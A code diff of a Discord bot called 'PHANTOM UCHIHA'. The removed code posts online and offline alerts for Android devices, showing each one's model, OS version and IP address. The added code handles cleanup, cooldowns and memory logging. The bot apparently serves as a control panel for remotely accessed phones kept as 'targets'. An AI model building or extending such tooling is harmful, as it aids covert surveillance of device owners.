-      const e = new EmbedBuilder()
-      const deviceName = ch.name.replace('phantom-', '')
-      const cardBuffer = await statusCard({
-        deviceName, status: online ? 'online' : 'offline',
-        model: mModel !== '?' ? mModel : 'Unknown',
-        android: mAndroid !== '?' ? mAndroid : 'Unknown',
-        ip: mIp !== '?' ? mIp : 'Unknown',
-        lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'),
-        theme: 'blood'
-      })
-      const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
-      if (!online) {
-        const ago = lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'
-        const fields = [
-          { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
-          { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
-          { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
-          { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
-          { name: `${E.clock} Last Seen`, value: ago, inline: true },
-          { name: `${E.heart} Status`, value: `${E.coffin} **OFFLINE**`, inline: true },
-        ]
-        e.setColor(C.void)
-          .setTitle(`${E.coffin} ${ch.name} EXSANGUINATED ${E.coffin}`)
-          .setThumbnail(gifForCategory('offline'))
-          .setImage(`attachment://status-${deviceName}.png`)
-          .addFields(fields)
-          .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.alert })
-        await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
-      } else {
-        const fields = [
-          { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
-          { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
-          { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
-          { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
-          { name: `${E.heart} Status`, value: `${E.chain} **ONLINE**`, inline: true },
-          { name: `${E.zap} Connected`, value: ts(), inline: true },
-        ]
-        e.setColor(C.neon)
-          .setTitle(`${E.chain} ${ch.name} REANIMATED ${E.chain}`)
-          .setThumbnail(gifForCategory('online'))
-          .setImage(`attachment://status-${deviceName}.png`)
-          .addFields(fields)
-          .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.correct })
-        await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
+      } finally {
+        deviceCheckLocks.delete(ch.id)
       }
-    }
+    }))
   } catch (err) { console.error('Status:', err.message) }
   finally { checkerRunning = false }
 }
@@ -1237,6 +1123,15 @@ function cleanupMaps() {
   for (const [uid, data] of rateLimits) {
     if (now - data.ts > RATE_LIMIT_WINDOW) rateLimits.delete(uid)
   }
+  for (const [uid, ts] of commandCooldowns) {
+    if (now - ts > COMMAND_COOLDOWN * 2) commandCooldowns.delete(uid)
+  }
+  for (const [uid, log] of commandLog) {
+    if (log.length > COMMAND_LOG_MAX) commandLog.set(uid, log.slice(-COMMAND_LOG_MAX))
+  }
+  for (const [key, ts] of alertCooldown) {
+    if (now - ts > 600000) alertCooldown.delete(key)
+  }
 }
 
 function cleanupMapsInterval() {
@@ -1247,6 +1142,12 @@ function cleanupMapsInterval() {
 
 client.once(Events.ClientReady, async () => {
   console.log(`[+] ${client.user.tag} online`)
+
+  // ── Memory Monitor ───────────────────────────────────────────────────────
+  setInterval(() => {
+    const mem = process.memoryUsage()
+    console.log(`[MEM] RSS: ${(mem.rss / 1024 / 1024).toFixed(1)}MB | Heap: ${(mem.heapUsed / 1024 / 1024).toFixed(1)}MB | Maps: targets=${targets.size} status=${deviceStatus.size} pages=${devicePages.size}`)
+  }, 1800000)
 
   // ── Bot Profile Setup ───────────────────────────────────────────────────────
   try {
@@ -1275,9 +1176,9 @@ client.once(Events.ClientReady, async () => {
         .setColor(C.sharingan)
         .setTitle(`${E.sharingan} ${bold('PHANTOM UCHIHA')}`)
         .setDescription(lines.join('\n'))
-        .setThumbnail(gifForCategory('success'))
-        .setImage(gifForCategory('success'))
-        .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer })
+        .setThumbnail(randGif())
+        .setImage(randGif())
+        .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}` })
       await ch.send({ embeds: [e], components: MENU_BTNS }).catch(err => console.error('Startup:', err.message))
     }
   } else if (!ALLOWED_CHANNEL_ID) {
